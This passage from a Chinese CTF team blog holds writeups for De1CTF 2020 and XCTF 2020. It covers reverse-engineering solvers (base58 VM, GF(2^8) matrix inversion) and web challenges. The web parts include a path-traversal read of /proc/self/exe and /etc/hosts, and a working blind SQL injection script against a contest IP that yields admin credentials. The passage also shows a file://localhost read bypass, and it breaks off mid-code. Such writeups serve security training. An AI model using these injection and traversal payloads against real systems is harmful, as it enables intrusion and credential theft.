class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">_asm</span><br><span class="line">   &#123;</span><br><span class="line">       mov eax, _PE1</span><br><span class="line">       push eax</span><br><span class="line">       push fs : [0]</span><br><span class="line">       mov fs : [0] , esp</span><br><span class="line">       xor ecx, ecx</span><br><span class="line">       div ecx</span><br><span class="line">       retn</span><br><span class="line">       _PE1 :</span><br><span class="line">       mov esp, [esp + 8]</span><br><span class="line">           mov eax, fs : [0]</span><br><span class="line">           mov eax, [eax]</span><br><span class="line">           mov eax, [eax]</span><br><span class="line">           mov fs : [0] , eax</span><br><span class="line">           add esp, 8</span><br><span class="line">   &#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    _asm</span><br><span class="line">   &#123;</span><br><span class="line">       jz _P2</span><br><span class="line">       jnz _P2</span><br><span class="line">       _P1 :</span><br><span class="line">       __emit 0xE8</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">     _asm</span><br><span class="line">   &#123;</span><br><span class="line">       call _P1</span><br><span class="line">       _P1 :</span><br><span class="line">       add[esp], 5</span><br><span class="line">           retn</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">       _asm</span><br><span class="line">           &#123;</span><br><span class="line">               xor eax, eax</span><br><span class="line">               add eax, 2</span><br><span class="line">               ret 0xff</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>3.将flag包装内的20个字符分成10组，分组进行base58编码</p><p>机器码太长了，这里就放个伪码</p><p>需要注意的是，虽然用的table是64位长,但是使用的算法是base58而不是base64</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">table = '0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/='</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">10</span>;++i)&#123;</span><br><span class="line">  reg = (memSpace[<span class="number">0x20</span>+i*<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)+memspace(<span class="number">0x21</span>+i*<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">3</span>;j&gt;<span class="number">0</span>;--j)&#123;</span><br><span class="line">    memspace[<span class="number">0x39</span>+j+i*<span class="number">3</span>] = table[reg%<span class="number">58</span>];</span><br><span class="line">    reg /= <span class="number">58</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.分组加密</p><p>然后不知道咋的，突发奇想吧，搞了轮加密，分组进行的。</p><p>模加，模减，异或这三种运算都是可逆的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(int i = <span class="number">0</span>,i&lt;<span class="number">30</span>,i+=<span class="number">3</span>)&#123;</span><br><span class="line">  memSpace[<span class="number">0x40</span>+i+<span class="number">1</span>] = memSpace[<span class="number">0x40</span>+i+<span class="number">1</span>]+memSpace[<span class="number">0x40</span>+i+<span class="number">0</span>];</span><br><span class="line">  memSpace[<span class="number">0x40</span>+i+<span class="number">2</span>] = memSpace[<span class="number">0x40</span>+i+<span class="number">2</span>]-memSpace[<span class="number">0x40</span>+i+<span class="number">1</span>];</span><br><span class="line">  memSpace[<span class="number">0x40</span>+i+<span class="number">0</span>] = memSpace[<span class="number">0x40</span>+i+<span class="number">0</span>]^memSpace[<span class="number">0x40</span>+i+<span class="number">2</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5.对加密后的结果进行检测</p><p>不放机器码的理由同上。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">enc_flag = [<span class="number">0x7a</span>,<span class="number">0x19</span>,<span class="number">0x4f</span>,<span class="number">0x6e</span>,<span class="number">0xe</span>,<span class="number">0x56</span>,<span class="number">0xaf</span>,<span class="number">0x1f</span>,<span class="number">0x98</span>,<span class="number">0x58</span>,<span class="number">0xe</span>,<span class="number">0x60</span>,<span class="number">0xbd</span>,<span class="number">0x42</span>,<span class="number">0x8a</span>,<span class="number">0xa2</span>,<span class="number">0x20</span>,<span class="number">0x97</span>,<span class="number">0xb0</span>,<span class="number">0x3d</span>,<span class="number">0x87</span>,<span class="number">0xa0</span>,<span class="number">0x22</span>,<span class="number">0x95</span>,<span class="number">0x79</span>,<span class="number">0xf9</span>,<span class="number">0x41</span>,<span class="number">0x54</span>,<span class="number">0xc</span>,<span class="number">0x6d</span>]</span><br><span class="line"><span class="keyword">for</span> i in range(len(enc_flag)):</span><br><span class="line">    <span class="keyword">if</span> enc_flag[i]!=memSpace[i]:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>6.虚拟机运行完毕，返回true</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0xab</span>:<span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><h3><span id="exppy">exp.py</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">enc_flag = [<span class="number">0x7a</span>,<span class="number">0x19</span>,<span class="number">0x4f</span>,<span class="number">0x6e</span>,<span class="number">0xe</span>,<span class="number">0x56</span>,<span class="number">0xaf</span>,<span class="number">0x1f</span>,<span class="number">0x98</span>,<span class="number">0x58</span>,<span class="number">0xe</span>,<span class="number">0x60</span>,<span class="number">0xbd</span>,<span class="number">0x42</span>,<span class="number">0x8a</span>,<span class="number">0xa2</span>,<span class="number">0x20</span>,<span class="number">0x97</span>,<span class="number">0xb0</span>,<span class="number">0x3d</span>,<span class="number">0x87</span>,<span class="number">0xa0</span>,<span class="number">0x22</span>,<span class="number">0x95</span>,<span class="number">0x79</span>,<span class="number">0xf9</span>,<span class="number">0x41</span>,<span class="number">0x54</span>,<span class="number">0xc</span>,<span class="number">0x6d</span>]</span><br><span class="line">table = <span class="string">'0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/='</span></span><br><span class="line">enc = [<span class="keyword">None</span>]*<span class="number">30</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(i!=<span class="number">30</span>):</span><br><span class="line">  enc_flag[i+<span class="number">0</span>] = enc_flag[i+<span class="number">2</span>]^enc_flag[i+<span class="number">0</span>]</span><br><span class="line">  enc_flag[i+<span class="number">2</span>] = (enc_flag[i+<span class="number">2</span>]-enc_flag[i+<span class="number">1</span>]+<span class="number">0x100</span>)%<span class="number">0x100</span></span><br><span class="line">  enc_flag[i+<span class="number">1</span>] = (enc_flag[i]+enc_flag[i+<span class="number">1</span>]+<span class="number">0x100</span>)%<span class="number">0x100</span></span><br><span class="line">  i+=<span class="number">3</span></span><br><span class="line"></span><br><span class="line">temp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc_flag)):</span><br><span class="line">  temp += chr(enc_flag[i])</span><br><span class="line">enc_flag = temp</span><br><span class="line">print(enc_flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc_flag)):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> range(len(table)):</span><br><span class="line">    <span class="keyword">if</span> ord(enc_flag[i])==ord(table[j]):</span><br><span class="line">      enc[i] = j</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"de1ctf&#123;"</span>,end = <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">  temp = enc[i*<span class="number">3</span>]*<span class="number">58</span>*<span class="number">58</span>+enc[i*<span class="number">3</span>+<span class="number">1</span>]*<span class="number">58</span>+enc[i*<span class="number">3</span>+<span class="number">2</span>]</span><br><span class="line">  print(<span class="string">"&#123;&#125;&#123;&#125;"</span>.format(chr(temp//<span class="number">256</span>),chr(temp%<span class="number">256</span>)),end = <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"&#125;"</span>,end = <span class="string">''</span>)</span><br></pre></td></tr></table></figure><h2><span id="little-elves">little elves</span></h2><p>参考一个很小的elf头tiny elf，直接能执行汇编代码，通过系统调用获取输入，校验完后调用exit，正确会返回0，错误返回1。</p><p>加入了一些简单的花指令，基本上匹配对应模式就可以去除。</p><p>需要注意的是，elf头中定义的程序头的偏移是在4的位置，从第四个字节开始程序头和ELF头进行了复用。程序头的第三个成员代表段的其实地址，可以看到是00888000，所以加载的时候要自定义偏移0x888000，后续一些地址才是正确的。</p><p>算法方面，是有限域GF(2<sup>8)上的矩阵乘法（就像希尔密码），用到的多项式是x</sup>9+x<sup>5+x</sup>4+x<sup>3+1，（<code>Rijndael MixColumns</code>中用的是x</sup>9+x<sup>4+x</sup>3+x+1），需要一点点数学功底，或者求助密码学队友。</p><p>使用sage计算矩阵的逆</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">flag = <span class="string">"De1CTF&#123;01ab211f-589b-40b7-9ee4-4243f541fc40&#125;"</span></span><br><span class="line">SIZE = len(flag)</span><br><span class="line">res = [<span class="number">200</span>, <span class="number">201</span>, <span class="number">204</span>, <span class="number">116</span>, <span class="number">124</span>, <span class="number">94</span>, <span class="number">129</span>, <span class="number">127</span>, <span class="number">211</span>, <span class="number">85</span>, <span class="number">61</span>, <span class="number">154</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">19</span>, <span class="number">134</span>, <span class="number">121</span>, <span class="number">70</span>, <span class="number">100</span>, <span class="number">219</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">93</span>, <span class="number">252</span>, <span class="number">152</span>, <span class="number">87</span>, <span class="number">32</span>, <span class="number">171</span>, <span class="number">228</span>, <span class="number">156</span>, <span class="number">43</span>, <span class="number">98</span>, <span class="number">203</span>, <span class="number">2</span>, <span class="number">24</span>, <span class="number">63</span>, <span class="number">215</span>, <span class="number">186</span>, <span class="number">201</span>, <span class="number">128</span>, <span class="number">103</span>, <span class="number">52</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">i2x</span><span class="params">(num)</span>:</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> num!=<span class="number">0</span>:</span><br><span class="line">        res += (num&amp;<span class="number">1</span>) * (x^i)</span><br><span class="line">        num &gt;&gt;= <span class="number">1</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">i2y</span><span class="params">(num)</span>:</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> num!=<span class="number">0</span>:</span><br><span class="line">        res += (num&amp;<span class="number">1</span>) * (y^i)</span><br><span class="line">        num &gt;&gt;= <span class="number">1</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">y2i</span><span class="params">(r)</span>:</span></span><br><span class="line">    tmp = r.list()</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tmp[::<span class="number">-1</span>]:</span><br><span class="line">        res &lt;&lt;= <span class="number">1</span></span><br><span class="line">        res += int(i)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vi2y</span><span class="params">(v)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">        res.append(i2y(i))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vy2i</span><span class="params">(v)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">        res.append(y2i(i))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mi2y</span><span class="params">(m)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        res.append(vi2y(i))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my2i</span><span class="params">(m)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        res.append(vy2i(i))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(GF(<span class="number">2</span>), <span class="string">'x'</span>)</span><br><span class="line">S.&lt;y&gt; = QuotientRing(R, R.ideal(i2x(<span class="number">313</span>)))</span><br><span class="line"></span><br><span class="line">M = MatrixSpace(S, SIZE, SIZE)</span><br><span class="line">V = VectorSpace(S, SIZE)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genM</span><span class="params">()</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(SIZE):</span><br><span class="line">        tmp = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(SIZE):</span><br><span class="line">            tmp.append(random.randint(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">        res.append(tmp)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">A = <span class="comment"># matrix here ...</span></span><br><span class="line"><span class="comment">#A = genM()</span></span><br><span class="line">AM = M(mi2y(A))</span><br><span class="line">v = V(vi2y(res))</span><br><span class="line">f = vy2i(AM.solve_right(v))</span><br><span class="line">f = <span class="string">""</span>.join(map(chr, f))</span><br><span class="line">print(f)</span><br></pre></td></tr></table></figure><h2><span id="mc_ticktock">mc_ticktock</span></h2><p>文件列表： <a href="https://pastebin.com/YtCdrzCd" target="_blank" rel="noopener">exp.go</a> <a href="https://pastebin.com/rWAPYaRp" target="_blank" rel="noopener">types.go</a> <a href="https://pastebin.com/CYtng7mR" target="_blank" rel="noopener">crypt.go</a></p><p>上一题提到的 <code>/MC2020-DEBUG-VIEW:-)</code> 隐藏命令，是管理员用于读取指定 <code>uuid</code> 玩家 <code>log日志文件</code> 的命令。</p><p>很容易联想到 <code>目录穿越</code> 去实现 <code>任意文件读取</code>。</p><p>接下来我们可以读取以及逆向 <code>../../../../../../../proc/self/exe</code> (<code>go run exp.go types.go crypt.go -s1</code>)</p><p>文件含有符号表。</p><p>在 <code>main_main</code> 函数开头可以找到以下代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_, err := os.Stat(&quot;webserver&quot;)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">    log.Fatal(&quot;webserver not found&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们继续读 <code>../../../../../../../proc/self/cwd/webserver</code> (<code>go run exp.go types.go crypt.go -s2</code>)</p><p>文件没有符号表，可以使用 <a href="https://github.com/sibears/IDAGolangHelper" target="_blank" rel="noopener">IDAGolangHelper</a> 进行恢复。</p><p>文件有以下三个功能。</p><ol type="1"><li><code>http://:80/ticktock?text={text}</code></li></ol><p>这里会有一个修改过的 SM4 加密算法，会对 {text} 进行加密，然后返回密文，同时与预设密文进行比较。比较相同，会将你的ip记录下来，然后你才能使用功能二和功能三，此时明文就是本题的flag值。</p><p>记录ip的表每20分钟（20分钟是mc里一昼夜的时间）清空一次。</p><p>加密过程大致如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">KEY := Sha256([]byte(&quot;de1ctf-mc2020&quot;))</span><br><span class="line">NONCE := Sha256([]byte(&quot;de1ta-team&quot;))[:24]</span><br><span class="line">c, _ := crypt.NewCipher(KEY[:16])</span><br><span class="line">s := cipher.NewCFBEncrypter(c, NONCE[:16])</span><br><span class="line">plain := []byte(&quot;example plain text&quot;)</span><br><span class="line">buff := make([]byte, len(plain))</span><br><span class="line">s.XORKeyStream(buff, plain)</span><br></pre></td></tr></table></figure><ol start="2" type="1"><li><code>http://:80/webproxy</code></li></ol><p>由于平时在开发网络协议，所以出题时也写了个代理，作为考点，想让选手访问内部网络的题。然后没想到有点难度，最后比赛过程中，这部分被临时砍掉了，出题人翻车了。</p><p>使用这个代理功能，可以实现 <code>http代理</code> 和 <code>端口扫描</code> 的功能。</p><p>剩下三道题 <code>mc_realworld</code> &amp; <code>mc_logclient</code> &amp; <code>mc_noisemap</code> 都需要使用这个代理去访问。</p><p>三道题的ip，可以使用 <code>/MC2020-DEBUG-VIEW:-) ../../../../../etc/hosts</code> 读取 <code>/etc/hosts</code> 来获取。</p><p>如何使用呢？发 POST 请求，POST 请求 BODY 使用 <code>chacha20</code> 加密。加密过程如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">KEY := Sha256([]byte(&quot;de1ctf-mc2020&quot;))</span><br><span class="line">NONCE := Sha256([]byte(&quot;de1ta-team&quot;))[:24]</span><br><span class="line">cipher, _ := chacha20.NewUnauthenticatedCipher(KEY[:], NONCE[:])</span><br><span class="line">body := []byte(&quot;127.0.0.1:80|GET /assets/ HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n&quot;)</span><br><span class="line">buff := make([]byte, len(body))</span><br><span class="line">cipher.XORKeyStream(buff, body)</span><br></pre></td></tr></table></figure><ol start="3" type="1"><li><code>tcp://:8080/</code></li></ol><p>一个自定义TCP代理，用于 <code>mc_realworld</code> 的游戏服务。双向流量使用上面提到的 <code>chacha20</code> 加密。</p><p>使用命令 <code>go run exp.go types.go crypt.go -s3</code>，可以得到 flag。</p><p><code>De1CTF{t1Ck-t0ck_Tlck-1ocK_MC2O20_:)SM4}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;de1ta-team&quot;&gt;&lt;strong&gt;De1ta-Team&lt;/strong&gt;&lt;/h1&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://blog.de1ta.com/tags/ctf/"/>
    
      <category term="re" scheme="https://blog.de1ta.com/tags/re/"/>
    
      <category term="web" scheme="https://blog.de1ta.com/tags/web/"/>
    
      <category term="crypto" scheme="https://blog.de1ta.com/tags/crypto/"/>
    
      <category term="pwn" scheme="https://blog.de1ta.com/tags/pwn/"/>
    
      <category term="misc" scheme="https://blog.de1ta.com/tags/misc/"/>
    
      <category term="writeup" scheme="https://blog.de1ta.com/tags/writeup/"/>
    
      <category term="xctf" scheme="https://blog.de1ta.com/tags/xctf/"/>
    
  </entry>
  
  <entry>
    <title>XCTF战疫 2020 Writeup</title>
    <link href="https://blog.de1ta.com/2020/03/10/XCTF%3CZHANYI%3E-2020/"/>
    <id>https://blog.de1ta.com/2020/03/10/XCTF&lt;ZHANYI&gt;-2020/</id>
    <published>2020-03-10T04:00:00.000Z</published>
    <updated>2020-05-07T04:29:05.921Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="de1ta-team"><strong>De1ta-Team</strong></span></h1><a id="more"></a><blockquote><p>Team: De1ta</p></blockquote><p>前排广告位：De1ta长期招 逆向/pwn/密码学/硬件/取证/杂项/etc. 选手，急招二进制和密码选手,有意向的大佬请联系<code>ZGUxdGFAcHJvdG9ubWFpbC5jb20=</code></p><!-- toc --><ul><li><a href="#web">Web</a><ul><li><a href="#easy_trick_gzmtu">easy_trick_gzmtu</a></li><li><a href="#webct">webct</a></li><li><a href="#fmkq">fmkq</a></li><li><a href="#dooog">Dooog</a></li><li><a href="#guessgame">GuessGame</a></li><li><a href="#php-uaf">PHP-UAF</a></li><li><a href="#happyvacation">happyvacation</a></li><li><a href="#nothardweb">nothardweb</a></li><li><a href="#webtmp">webtmp</a></li><li><a href="#hackme">hackme</a></li><li><a href="#nweb">nweb</a></li><li><a href="#sqlcheckin">sqlcheckin</a></li></ul></li><li><a href="#re">Re</a><ul><li><a href="#clock">clock</a></li><li><a href="#cycle-graph">cycle graph</a></li><li><a href="#天津垓">天津垓</a></li><li><a href="#easyparser">easyparser</a></li><li><a href="#rubik">Rubik</a></li><li><a href="#babywasi">babywasi</a></li><li><a href="#fxck">fxck!</a></li></ul></li><li><a href="#mobile">mobile</a><ul><li><a href="#getflag">getflag</a></li></ul></li><li><a href="#misc">misc</a><ul><li><a href="#2019-ncov">2019-nCoV</a></li><li><a href="#ez_memusb">ez_mem&amp;usb</a></li><li><a href="#misc-隐藏的信息">Misc-隐藏的信息</a></li><li><a href="#武汉加油">武汉加油</a></li><li><a href="#简单misc">简单Misc</a></li></ul></li><li><a href="#crypto">Crypto</a><ul><li><a href="#nhp">NHP</a></li><li><a href="#lancet">lancet</a></li></ul></li><li><a href="#区块链">区块链</a><ul><li><a href="#blockchain-ownermoney">BlockChain-OwnerMoney</a></li></ul></li><li><a href="#pwn">Pwn</a><ul><li><a href="#easyvm">EasyVM</a></li><li><a href="#shotest_path_v2">Shotest_Path_v2</a></li><li><a href="#babykernel">babykernel</a></li><li><a href="#babykernel2">babykernel2</a></li><li><a href="#bjut">bjut</a></li><li><a href="#easy_heap">easy_heap</a></li><li><a href="#easy_unicorn4">easy_unicorn4</a></li><li><a href="#kernoob">kernoob</a></li><li><a href="#lgd">lgd</a></li><li><a href="#musl">musl</a></li><li><a href="#rustpad">rustpad</a></li><li><a href="#twochunk">twochunk</a></li><li><a href="#woodenbox">woodenbox</a></li></ul></li></ul><!-- tocstop --><h1><span id="web">Web</span></h1><h2><span id="easy_trick_gzmtu">easy_trick_gzmtu</span></h2><p>传入2020 和Y都能查出结果，传入y20，yy，20y也可以， 猜测后端对参数做了date()转换，用，于是构造盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">se = requests.Session()</span><br><span class="line"></span><br><span class="line">pl = <span class="string">r'http://121.37.181.246:6333/?time=0%%27||(\a\s\c\i\i(\s\u\b\s\t\r((\s\e\l\e\c\t%%20\d\a\t\a\b\a\s\e()),%d,1)))=%d%%23'</span></span><br><span class="line">pl = <span class="string">r'http://121.37.181.246:6333/?time=0%%27||(\a\s\c\i\i(\s\u\b\s\t\r((\s\e\l\e\c\t%%20\g\r\o\u\p_\c\o\n\c\a\t(\t\a\b\l\e_\n\a\m\e)%%20\f\r\o\m%%20\i\n\f\o\r\m\a\t\i\o\n_\s\c\h\e\m\a.\t\a\b\l\e\s \w\h\e\r\e \t\a\b\l\e_\s\c\h\e\m\a=\d\a\t\a\b\a\s\e()),%d,1)))=%d%%23'</span></span><br><span class="line">pl = <span class="string">r'http://121.37.181.246:6333/?time=0%%27||(\a\s\c\i\i(\s\u\b\s\t\r((\s\e\l\e\c\t%%20\g\r\o\u\p_\c\o\n\c\a\t(\c\o\l\u\m\n_\n\a\m\e)%%20\f\r\o\m%%20\i\n\f\o\r\m\a\t\i\o\n_\s\c\h\e\m\a.\c\o\l\u\m\n\s%%20\w\h\e\r\e%%20\t\a\b\l\e_\n\a\m\e=%%27\a\d\m\i\n%%27),%d,1)))=%d%%23'</span></span><br><span class="line">pl = <span class="string">r'http://121.37.181.246:6333/?time=0%%27||(\a\s\c\i\i(\s\u\b\s\t\r((\s\e\l\e\c\t%%20\g\r\o\u\p_\c\o\n\c\a\t(\u\r\l)%%20\f\r\o\m%%20\a\d\m\i\n),%d,1)))=%d%%23'</span></span><br><span class="line">text = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> xrange(<span class="number">33</span>,<span class="number">126</span>):</span><br><span class="line">                res = se.get(pl % (x,y))</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'Hello World --Brian Kernighan'</span> <span class="keyword">in</span> res.content:</span><br><span class="line">                        text += chr(y)</span><br><span class="line">                        <span class="keyword">print</span> text</span><br><span class="line">                        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>注入出一个admin用户 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">账号 admin</span><br><span class="line">密码 20200202goodluck</span><br><span class="line">URL：http://121.37.181.246:6333/eGlhb2xldW5n/</span><br></pre></td></tr></table></figure></p><p>有个读文件的地方，限制了只能本地读取文件，发现<code>file://localhost/</code>可以绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.37.181.246:6333/eGlhb2xldW5n/check.php?url=file://localhost/var/www/html/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 